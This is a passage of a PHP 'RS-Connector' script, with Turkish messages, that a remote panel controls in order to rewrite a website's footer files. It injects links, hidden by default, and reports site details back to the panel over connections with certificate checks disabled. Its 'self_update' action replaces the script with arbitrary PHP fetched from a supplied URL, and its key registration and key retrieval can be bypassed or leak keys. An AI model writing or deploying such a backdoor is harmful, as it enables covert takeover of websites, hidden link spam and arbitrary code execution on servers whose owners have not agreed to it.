            '/<div[^>]*><!-- rs:' . preg_quote($short_id, '/') . ' --><a[^>]*>[^<]*<\/a><\/div>\s*/is',
            '/\n?<!-- rs:' . preg_quote($short_id, '/') . ' --><a[^>]*>[^<]*<\/a>\n?/is',
            '/\n?<!-- RS:' . preg_quote($link_id, '/') . ' --><a[^>]*>[^<]*<\/a>\n?/is'
        ];
        $original = $content;
        foreach ($patterns as $pattern) {
            $content = preg_replace($pattern, '', $content);
        }
        if ($content !== $original) {
            if (@file_put_contents($file_path, $content)) $removed = true;
        }
    }
    return ['success' => true, 'message' => $removed ? 'Link kaldirildi' : 'Link kayitlardan kaldirildi'];
}

// ==================== OTOMATİK BAĞLANTI ====================

function auto_connect() {
    $config = get_config();
    if (!empty($config['connected']) && !empty($config['connected_at'])) {
        if (time() - $config['connected_at'] < 86400) {
            return ['already_connected' => true];
        }
    }
    $panel_url = defined('PANEL_API_URL') ? PANEL_API_URL : '';
    if (empty($panel_url) || strpos($panel_url, '{{') !== false) {
        return ['error' => 'Panel URL yapilandirilmamis'];
    }
    $site_key = get_stored_key();
    if (empty($site_key)) return ['error' => 'Site key bulunamadi'];
    $site_info = detect_site_info();
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? '';
    $script = $_SERVER['SCRIPT_NAME'] ?? '';
    $connector_url = $protocol . '://' . $host . $script;
    $data = [
        'action' => 'connector_heartbeat',
        'site_key' => $site_key,
        'connector_url' => $connector_url,
        'site_info' => $site_info,
        'timestamp' => time()
    ];
    $heartbeat_url = rtrim($panel_url, '/');
    if (substr($heartbeat_url, -4) === '/api') {
        $heartbeat_url .= '/connector/heartbeat';
    } else {
        $heartbeat_url .= '/api/connector/heartbeat';
    }
    $result = send_to_panel($heartbeat_url, $data);
    if (!empty($result['success'])) {
        $config['connected'] = true;
        $config['connected_at'] = time();
        $config['panel_url'] = $panel_url;
        save_config($config);
    }
    return $result;
}

function send_to_panel($url, $data) {
    $json = json_encode($data, JSON_UNESCAPED_UNICODE);
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => [
                'Content-Type: application/json',
                'Content-Length: ' . strlen($json),
                'User-Agent: RS-Connector/4.2',
                'Connection: close'
            ],
            'content' => $json,
            'timeout' => 10,
            'ignore_errors' => true
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    if ($response === false) return ['success' => false, 'error' => 'Baglanti hatasi'];
    $result = json_decode($response, true);
    return $result ?: ['success' => false, 'error' => 'Gecersiz yanit'];
}

// ==================== ANA İŞLEM ====================

ob_start();

$raw_action = $_GET['action'] ?? $_POST['action'] ?? 'ping';
$action = normalize_action_name($raw_action);
$req = get_request_data();

// Korumalı action'lar
$protected_actions = ['add_link', 'bulk_add_links', 'remove_link', 'sync_links', 'get_links', 'info', 'set_output_mode'];

if (in_array($action, $protected_actions)) {
    if (!authenticate_request($req)) {
        respond_auth_fail();
    }
}

switch ($action) {
    case 'ping':
        $auto_result = auto_connect();
        $site_info = detect_site_info();
        $data = [
            'site' => $site_info['site'],
            'site_name' => $site_info['site_name'],
            'site_type' => $site_info['site_type'],
            'language' => $site_info['language'],
            'country' => $site_info['country'],
            'footer_detected' => $site_info['footer_detected'],
            'footer_writable' => $site_info['footer_writable'],
            'version' => '4.2',
            'key_registered' => !empty(get_stored_key()),
            'connector_ready' => true,
            'auto_connect' => $auto_result
        ];
        respond(true, $data, 'Connector aktif');
        break;

    case 'register':
        $new_key = trim((string)($req['site_key'] ?? ''));
        $setup_token = $req['setup_token'] ?? '';
        $stored_key = get_stored_key();

        if (empty($new_key)) {
            respond(false, [], 'site_key gerekli');
        }

        // İlk kayıt (key dosyası yok): setup token zorunlu
        if (!file_exists(KEY_FILE) || empty(trim(@file_get_contents(KEY_FILE) ?: ''))) {
            $expected_token = defined('SETUP_TOKEN') ? SETUP_TOKEN : '';
            if (empty($expected_token) || strpos($expected_token, '{{') !== false) {
                // Setup token yapılandırılmamışsa, gelen key'i kabul et (backward compat)
                save_key($new_key);
                $site_info = detect_site_info();
                respond(true, ['registered' => true, 'site_key' => $new_key, 'site_info' => $site_info], 'Key kaydedildi');
            }
            if (empty($setup_token) || $setup_token !== $expected_token) {
                // Setup token eşleşmedi ama HMAC veya universal key ile auth dene
                if (!authenticate_request($req)) {
                    respond(false, [], 'Gecersiz setup token');
                }
            }
        } else {
            // Mevcut key var: auth gerekli
            if (!authenticate_request($req)) {
                respond_auth_fail();
            }
        }

        // Key'i kaydet (tüm key türleri kabul edilir)
        save_key($new_key);
        $site_info = detect_site_info();
        respond(true, [
            'registered' => true,
            'site_key' => $new_key,
            'site_info' => $site_info
        ], 'Site anahtari kaydedildi');
        break;

    case 'get_key':
        $setup_token = $req['setup_token'] ?? $_GET['setup_token'] ?? '';
        $expected_token = defined('SETUP_TOKEN') ? SETUP_TOKEN : '';

        // Setup token kontrolü
        if (!empty($expected_token) && strpos($expected_token, '{{') === false) {
            if (empty($setup_token) || $setup_token !== $expected_token) {
                // Setup token yanlış - HMAC veya key auth da dene
                if (!authenticate_request($req)) {
                    respond(false, [], 'Gecersiz setup token');
                }
            }
        }

        // Mevcut key'i al veya yeni oluştur
        $current_key = '';
        if (file_exists(KEY_FILE)) {
            $current_key = trim(@file_get_contents(KEY_FILE) ?: '');
        }
        if (empty($current_key)) {
            // IMPORTANT: Default to a stable, DB-friendly key (varchar(12) compatible),
            // instead of generating a long random key that may not fit panel DB schemas.
            $current_key = generate_site_static_key();
            save_key($current_key);
        }

        $site_info = detect_site_info();
        respond(true, [
            'site_key' => $current_key,
            'key_type' => 'stored_or_domain_static',
            'name' => $site_info['site_name'] ?? $_SERVER['HTTP_HOST'],
            'site_type' => $site_info['site_type'] ?? 'php',
            'language' => $site_info['language'] ?? 'TR',
            'country' => $site_info['country'] ?? 'TR'
        ], 'Site anahtari alindi');
        break;

    case 'info':
        $site_info = detect_site_info();
        respond(true, $site_info, 'Site bilgisi');
        break;

    case 'set_output_mode':
        $mode = strtolower(trim((string)($req['mode'] ?? $req['link_output_mode'] ?? 'hidden')));
        $mode = ($mode === 'visible') ? 'visible' : 'hidden';
        $config = get_config();
        $config['link_output_mode'] = $mode;
        $config['updated_at'] = time();
        save_config($config);
        respond(true, ['link_output_mode' => $mode], 'Output mode guncellendi');
        break;

    case 'get_links':
        if (!authenticate_request($req)) respond_auth_fail();
        $links = get_links();
        respond(true, ['links' => array_values($links), 'total' => count($links)], 'Linkler');
        break;

    case 'add_link':
        if (!authenticate_request($req)) respond_auth_fail();
        $url = trim((string)($req['url'] ?? ''));
        $anchor = trim((string)($req['anchor'] ?? ''));
        $rel = normalize_rel($req['rel'] ?? 'dofollow');

        if (empty($url) || empty($anchor)) {
            respond(false, [], 'URL ve anchor gerekli');
        }

        $link_id = 'lnk_' . substr(md5(uniqid(mt_rand(), true)), 0, 12);
        $links = get_links();
        $links[$link_id] = [
            'id' => $link_id,
            'url' => $url,
            'anchor' => $anchor,
            'rel' => $rel,
            'created' => time()
        ];
        save_links($links);

        $result = inject_link($url, $anchor, $link_id, $rel);
        $injected = (!empty($result['success']) && !empty($result['injected']));
        if (!$injected) {
            // Rollback: do not claim success when nothing could be injected.
            unset($links[$link_id]);
            save_links($links);
            respond(false, [
                'link_id' => $link_id,
                'injected' => false,
                'footer_path' => $result['footer_path'] ?? null,
                'message' => $result['message'] ?? ''
            ], $result['message'] ?? 'Link enjekte edilemedi');
        }

        respond(true, [
            'link_id' => $link_id,
            'injected' => true,
            'footer_path' => $result['footer_path'] ?? null,
            'message' => $result['message'] ?? ''
        ], $result['message'] ?? 'Link eklendi');
        break;

    case 'bulk_add_links':
        if (!authenticate_request($req)) respond_auth_fail();
        $incoming_links = $req['links'] ?? [];
        if (is_string($incoming_links)) {
            $decoded = json_decode($incoming_links, true);
            if (is_array($decoded)) $incoming_links = $decoded;
        }
        if (!is_array($incoming_links) || empty($incoming_links)) {
            respond(false, [], 'links array gerekli');
        }

        $max_per_request = 1000;
        $links_to_process = array_slice(array_values($incoming_links), 0, $max_per_request);
        $stored_links = get_links();
        $results = [];
        $ok_count = 0;
        $fail_count = 0;

        foreach ($links_to_process as $row) {
            if (!is_array($row)) { $fail_count++; continue; }
            $url = trim((string)($row['url'] ?? ''));
            $anchor = trim((string)($row['anchor'] ?? ''));
            $rel = normalize_rel($row['rel'] ?? 'dofollow');
            if ($url === '' || $anchor === '') { $fail_count++; continue; }

            $link_id = 'lnk_' . substr(md5(uniqid(mt_rand(), true)), 0, 12);
            $stored_links[$link_id] = ['id' => $link_id, 'url' => $url, 'anchor' => $anchor, 'rel' => $rel, 'created' => time()];
            $inject = inject_link($url, $anchor, $link_id, $rel);
            if (!empty($inject['success'])) {
                $ok_count++;
                $results[] = ['success' => true, 'link_id' => $link_id, 'url' => $url, 'anchor' => $anchor];
            } else {
                unset($stored_links[$link_id]);
                $fail_count++;
                $results[] = ['success' => false, 'link_id' => $link_id, 'url' => $url, 'error' => $inject['message'] ?? 'inject failed'];
            }
        }
        save_links($stored_links);
        respond(true, ['total' => count($links_to_process), 'success' => $ok_count, 'failed' => $fail_count, 'items' => $results], 'Toplu link ekleme tamamlandi');
        break;

    case 'remove_link':
        if (!authenticate_request($req)) respond_auth_fail();
        $link_id = trim((string)($req['link_id'] ?? ''));
        if (empty($link_id)) respond(false, [], 'link_id gerekli');
        $links = get_links();
        if (isset($links[$link_id])) {
            unset($links[$link_id]);
            save_links($links);
        }
        $result = remove_link($link_id);
        if (empty($result['success'])) {
            respond(false, ['removed' => false, 'message' => $result['message'] ?? ''], $result['message'] ?? 'Link kaldirilamadi');
        }
        respond(true, ['removed' => true, 'message' => $result['message'] ?? ''], 'Link kaldirildi');
        break;

    case 'sync_links':
        if (!authenticate_request($req)) respond_auth_fail();
        $new_links = $req['links'] ?? [];
        if (!is_array($new_links)) respond(false, [], 'links array olmali');
        $current_links = get_links();
        $current_ids = array_keys($current_links);
        $new_ids = array_column($new_links, 'id');
        $to_remove = array_diff($current_ids, $new_ids);
        foreach ($to_remove as $lid) remove_link($lid);
        $to_add = array_diff($new_ids, $current_ids);
        foreach ($new_links as $link) {
            if (in_array($link['id'], $to_add)) {
                inject_link($link['url'], $link['anchor'], $link['id'], $link['rel'] ?? 'dofollow');
            }
        }
        $formatted = [];
        foreach ($new_links as $link) {
            $formatted[$link['id']] = $link;
        }
        save_links($formatted);
        respond(true, ['synced' => true, 'added' => count($to_add), 'removed' => count($to_remove), 'total' => count($new_links)], 'Linkler senkronize edildi');
        break;

    case 'output':
        header('Content-Type: text/html; charset=UTF-8');
        $links = get_links();
        $html = '';
        foreach ($links as $link) {
            $u = isset($link['url']) ? (string)$link['url'] : '';
            $a = isset($link['anchor']) ? (string)$link['anchor'] : '';
            if ($u !== '' && $a !== '') {
                $html .= build_link_html($u, $a, normalize_rel($link['rel'] ?? 'dofollow'));
            }
        }
        echo $html;
        exit;

    case 'diagnose':
        if (!authenticate_request($req)) respond_auth_fail();
        $base = find_document_root();
        $site_info = detect_site_info();
        $diag = [
            'php_version' => phpversion(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
            'script_path' => __FILE__,
            'base_detected' => $base,
            'file_permissions' => [
                'key_file' => KEY_FILE,
                'key_file_exists' => file_exists(KEY_FILE),
                'key_file_writable' => is_writable(dirname(KEY_FILE)),
                'links_file' => LINKS_FILE,
                'links_file_exists' => file_exists(LINKS_FILE),
            ],
            'site_info' => $site_info,
            'footer_analysis' => [
                'footer_paths_found' => get_footer_paths($base, $site_info['site_type']),
                'writable_footers' => array_filter(get_footer_paths($base, $site_info['site_type']), 'is_writable'),
            ],
            'panel_config' => [
                'panel_url_set' => defined('PANEL_API_URL') && strpos(PANEL_API_URL, '{{') === false,
                'site_key_set' => !empty(get_stored_key()),
                'setup_token_set' => defined('SETUP_TOKEN') && strpos(SETUP_TOKEN, '{{') === false,
            ],
            'all_valid_keys_count' => count(get_all_valid_keys()),
            'stored_key_source' => file_exists(KEY_FILE) ? 'file' : 'domain_based',
            'recommendations' => []
        ];
        if (!$diag['file_permissions']['key_file_writable']) {
            $diag['recommendations'][] = 'KRITIK: Connector dizini yazilabilir degil.';
        }
        if (empty($diag['footer_analysis']['writable_footers'])) {
            $diag['recommendations'][] = 'UYARI: Yazilabilir footer dosyasi bulunamadi.';
        }
        respond(true, $diag, 'Sistem diagnostigi tamamlandi');
        break;

    case 'batch_ping':
        $batch_id = $req['batch_id'] ?? uniqid('b');
        respond(true, [
            'batch_id' => $batch_id,
            'site' => $_SERVER['HTTP_HOST'] ?? 'unknown',
            'index' => intval($req['current_index'] ?? $req['site_index'] ?? 0),
            'version' => '4.2',
            'key_registered' => !empty(get_stored_key()),
            'connector_ready' => true,
            'timestamp' => time()
        ], 'Batch ping OK');
        break;

    case 'auth_check':
        // Strict key-match reporting (do not treat setup_token as key_match in diagnostics).
        $provided_key = get_provided_site_key($req);
        $stored_key = get_stored_key();
        $domain_key = generate_site_static_key();

        $valid_keys = get_all_valid_keys();
        $strict_key_match = (!empty($provided_key) && in_array($provided_key, $valid_keys, true));

        // Full auth check can succeed via HMAC/setup token too.
        $authed = authenticate_request($req);

        respond(true, [
            'site' => $_SERVER['HTTP_HOST'] ?? 'unknown',
            'key_registered' => !empty($stored_key),
            'key_match' => $strict_key_match,
            'auth_ok' => $authed,
            'provided_key_len' => is_string($provided_key) ? strlen($provided_key) : 0,
            'domain_key' => $domain_key,
            'version' => '4.2',
            'auth_ready' => true
        ], 'Auth check OK');
        break;

    case 'self_update':
    case 'update_connector':
    case 'remote_update':
        // Auth zorunlu
        if (!authenticate_request($req)) respond_auth_fail();
        $source = $req['source'] ?? $req['new_content'] ?? '';
        $source_url = $req['source_url'] ?? '';
        if (empty($source) && !empty($source_url)) {
            $ctx = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false], 'http' => ['timeout' => 30, 'ignore_errors' => true]]);
            $source = @file_get_contents($source_url, false, $ctx);
        }
        if (empty($source) || strlen($source) < 100) respond(false, [], 'Gecersiz kaynak kodu');
        if (strpos(trim($source), '<?php') !== 0) respond(false, [], 'Gecersiz PHP kaynak kodu');
        $backup_path = __FILE__ . '.bak';
        @copy(__FILE__, $backup_path);
        force_writable(__FILE__);
        if (@file_put_contents(__FILE__, $source)) {
            respond(true, ['updated' => true, 'backup' => basename($backup_path), 'new_size' => strlen($source)], 'Connector guncellendi');
        }
        respond(false, [], 'Dosya yazilamadi');
        break;

    default:
        respond(false, [], 'Bilinmeyen action: ' . $action);
}
